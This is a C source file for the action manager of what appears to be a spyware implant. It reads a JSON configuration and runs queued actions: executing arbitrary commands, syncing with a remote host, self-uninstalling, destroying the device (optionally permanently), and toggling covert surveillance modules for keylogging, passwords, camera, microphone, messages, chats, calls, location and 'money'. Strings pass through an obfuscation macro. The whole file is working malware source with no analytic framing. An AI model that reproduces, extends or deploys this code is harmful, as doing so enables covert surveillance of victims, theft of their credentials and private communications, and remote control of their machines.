#define _BSD_SOURCE
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#include "actionmanager.h"
#include "eventmanager.h"
#include "module.h"
#include "config.h"
#include "uninstall.h"
#include "me.h"
#include "so.h"

static void *run(void *data);

static int actionc = 0;
static action_t *actionlist = NULL;
static pthread_t t;
static pthread_mutex_t m = PTHREAD_MUTEX_INITIALIZER;
static int qstatus[2];

void am_parseactions(json_object *config)
{
   int i, j;
   json_object *actions, *subactions, *a;
   char *type, *v;
   subaction_t *s;

   pthread_mutex_lock(&m);

   for(i = 0; i < actionc; i++) {
      for(j = 0; j < actionlist[i].subactionc; j++) if(actionlist[i].subactionlist[j].param) free(actionlist[i].subactionlist[j].param);
      if(actionlist[i].subactionlist) free(actionlist[i].subactionlist);
   }
   if(actionlist) free(actionlist);

   actions = json_object_object_get(config, SO"actions");
   actionc = json_object_array_length(actions);
   actionlist = malloc(actionc * sizeof(action_t));

   for(i = 0; i < actionc; i++) {
      subactions = json_object_object_get(json_object_array_get_idx(actions, i), SO"subactions");
      actionlist[i].subactionc = json_object_array_length(subactions);
      actionlist[i].subactionlist = malloc(actionlist[i].subactionc * sizeof(subaction_t));
      actionlist[i].sched = 0;
      actionlist[i].queue = QUEUE_FAST;

      for(j = 0; j < actionlist[i].subactionc; j++) {
         a = json_object_array_get_idx(subactions, j);

         s = &actionlist[i].subactionlist[j];
         s->type = SUBACTION_NONE;

         if(get_string(a, SO"action", &type)) continue;
         if(!strcmp(type, SO"uninstall")) {
            s->param = NULL;
            s->type = SUBACTION_UNINSTALL;
            actionlist[i].queue = QUEUE_SLOW;
         } else if(!strcmp(type, SO"execute")) {
            if(!(s->param = malloc(sizeof(subaction_execute_t)))) continue;
            if(get_string(a, SO"command", &v)) continue;
            snprintf(((subaction_execute_t *)s->param)->command, sizeof(((subaction_execute_t *)s->param)->command), "%s", v);
            s->type = SUBACTION_EXECUTE;
            actionlist[i].queue = QUEUE_SLOW;
         } else if(!strcmp(type, SO"log")) {
            if(!(s->param = malloc(sizeof(subaction_log_t)))) continue;
            if(get_string(a, SO"text", &v)) continue;
            snprintf(((subaction_log_t *)s->param)->text, sizeof(((subaction_log_t *)s->param)->text), "%s", v);
            s->type = SUBACTION_LOG;
         } else if(!strcmp(type, SO"synchronize")) {
            if(!(s->param = malloc(sizeof(subaction_synchronize_t)))) continue;
            if(get_string(a, SO"host", &v)) continue;
            snprintf(((subaction_synchronize_t *)s->param)->host, sizeof(((subaction_synchronize_t *)s->param)->host), "%s", v);
            if(get_int(a, SO"bandwidth", &((subaction_synchronize_t *)s->param)->bandwidth)) continue;
            if(get_int(a, SO"mindelay", &((subaction_synchronize_t *)s->param)->mindelay)) continue;
            if(get_int(a, SO"maxdelay", &((subaction_synchronize_t *)s->param)->maxdelay)) continue;
            if(get_boolean(a, SO"stop", &((subaction_synchronize_t *)s->param)->stop)) continue;
            s->type = SUBACTION_SYNCHRONIZE;
            actionlist[i].queue = QUEUE_SLOW;
         } else if(!strcmp(type, SO"destroy")) {
            if(!(s->param = malloc(sizeof(subaction_destroy_t)))) continue;
            if(get_boolean(a, SO"permanent", &((subaction_destroy_t *)s->param)->permanent)) continue;
            s->type = SUBACTION_DESTROY;
         } else if(!strcmp(type, SO"event")) {
            if(!(s->param = malloc(sizeof(subaction_event_t)))) continue;
            if(get_int(a, SO"event", &((subaction_event_t *)s->param)->event)) continue;
            if(get_string(a, SO"status", &v)) continue;
            ((subaction_event_t *)s->param)->status = (strcmp(v, SO"enable") ? 0 : 1);
            s->type = SUBACTION_EVENT;
         } else if(!strcmp(type, SO"module")) {
            if(!(s->param = malloc(sizeof(subaction_module_t)))) continue;
            if(get_string(a, SO"module", &v)) continue;
            if(!strcmp(v, SO"device")) ((subaction_module_t *)s->param)->module = MODULE_DEVICE_INDEX;
            else if(!strcmp(v, SO"screenshot")) ((subaction_module_t *)s->param)->module = MODULE_SCREENSHOT_INDEX;
            else if(!strcmp(v, SO"application")) ((subaction_module_t *)s->param)->module = MODULE_APPLICATION_INDEX;
            else if(!strcmp(v, SO"position")) ((subaction_module_t *)s->param)->module = MODULE_POSITION_INDEX;
            else if(!strcmp(v, SO"camera")) ((subaction_module_t *)s->param)->module = MODULE_CAMERA_INDEX;
            else if(!strcmp(v, SO"mouse")) ((subaction_module_t *)s->param)->module = MODULE_MOUSE_INDEX;
            else if(!strcmp(v, SO"password")) ((subaction_module_t *)s->param)->module = MODULE_PASSWORD_INDEX;
            else if(!strcmp(v, SO"url")) ((subaction_module_t *)s->param)->module = MODULE_URL_INDEX;
            else if(!strcmp(v, SO"messages")) ((subaction_module_t *)s->param)->module = MODULE_MESSAGES_INDEX;
            else if(!strcmp(v, SO"addressbook")) ((subaction_module_t *)s->param)->module = MODULE_ADDRESSBOOK_INDEX;
            else if(!strcmp(v, SO"chat")) ((subaction_module_t *)s->param)->module = MODULE_CHAT_INDEX;
            else if(!strcmp(v, SO"call")) ((subaction_module_t *)s->param)->module = MODULE_CALL_INDEX;
            else if(!strcmp(v, SO"keylog")) ((subaction_module_t *)s->param)->module = MODULE_KEYLOG_INDEX;
            else if(!strcmp(v, SO"mic")) ((subaction_module_t *)s->param)->module = MODULE_MIC_INDEX;
            else if(!strcmp(v, SO"money")) ((subaction_module_t *)s->param)->module = MODULE_MONEY_INDEX;
            else continue;
            if(get_string(a, SO"status", &v)) continue;
            ((subaction_module_t *)s->param)->status = (strcmp(v, SO"start") ? 0 : 1);
            s->type = SUBACTION_MODULE;
         }
      }
   }

   pthread_mutex_unlock(&m);

   return;
}

void am_flushactions(void)
{
   int i, j;

   pthread_mutex_lock(&m);

   for(i = 0; i < actionc; i++) {
      for(j = 0; j < actionlist[i].subactionc; j++) if(actionlist[i].subactionlist[j].param) free(actionlist[i].subactionlist[j].param);
      if(actionlist[i].subactionlist) free(actionlist[i].subactionlist);
   }
   if(actionlist) free(actionlist);

   actionlist = NULL;
   actionc = 0;

   pthread_mutex_unlock(&m);

   return;
}

void createactions(void)
{
   qstatus[QUEUE_SLOW] = STATUS_STARTED;
   qstatus[QUEUE_FAST] = STATUS_STARTED;

   pthread_create(&t, NULL, run, (void *)QUEUE_SLOW);
   pthread_detach(t);
   pthread_create(&t, NULL, run, (void *)QUEUE_FAST);
   pthread_detach(t);

   return;
}

void am_queueaction(int actionnum)
{
   if(actionnum < actionc) actionlist[actionnum].sched = 1;

   return;
}

void am_startqueue(int q)
{
   qstatus[q] = STATUS_STARTING;

   while(qstatus[q] != STATUS_STARTED) sleep(1);

   return;
}

void am_stopqueue(int q)
{
   qstatus[q] = STATUS_STOPPING;

   while(qstatus[q] != STATUS_STOPPED) sleep(1);

   return;
}

static void *run(void *data)
{
   int i, j, ret;
   long queue = (long)data;
   subaction_t *s;

   while(1) {
      for(i = 0, ret = 0; i < actionc; i++) {
         if(qstatus[queue] == STATUS_STOPPING) {
            qstatus[queue] = STATUS_STOPPED;
            while(qstatus[queue] != STATUS_STARTING) sleep(1);
            qstatus[queue] = STATUS_STARTED;
            break;
         }
         if((actionlist[i].queue != queue) || (!actionlist[i].sched)) continue;
         for(j = 0; j < actionlist[i].subactionc; j++) {
            if(qstatus[queue] == STATUS_STOPPING) {
               qstatus[queue] = STATUS_STOPPED;
               while(qstatus[queue] != STATUS_STARTING) sleep(1);
               break;
            }

            s = &actionlist[i].subactionlist[j];

            switch(s->type) {
               case SUBACTION_UNINSTALL:
                  am_uninstall();
                  break;
               case SUBACTION_EXECUTE:
                  am_execute((subaction_execute_t *)s->param);
                  break;
               case SUBACTION_LOG:
                  am_log((subaction_log_t *)s->param);
                  break;
               case SUBACTION_SYNCHRONIZE:
                  debugme("--- begin synchronization ---\n");
                  ret = am_synchronize((subaction_synchronize_t *)s->param);
                  debugme("--- end synchronization (%d) ---\n", ret);
                  if(ret == 3) {
                     am_startqueue(QUEUE_FAST);
                     em_scheduleevents();
                  } else if(ret == -2) {
                     uninstall();
                  }
                  break;
               case SUBACTION_DESTROY:
                  am_destroy((subaction_destroy_t *)s->param);
                  break;
               case SUBACTION_EVENT:
                  am_event((subaction_event_t *)s->param);
                  break;
               case SUBACTION_MODULE:
                  am_module((subaction_module_t *)s->param);
                  break;
               default:
                  break;
            }
            if(ret == 3) break;
         }
         if(ret == 3) break;

         actionlist[i].sched = 0;
      }
      if(qstatus[queue] == STATUS_STARTING) qstatus[queue] = STATUS_STARTED;

      sleep(1);
   }

   return NULL;
}
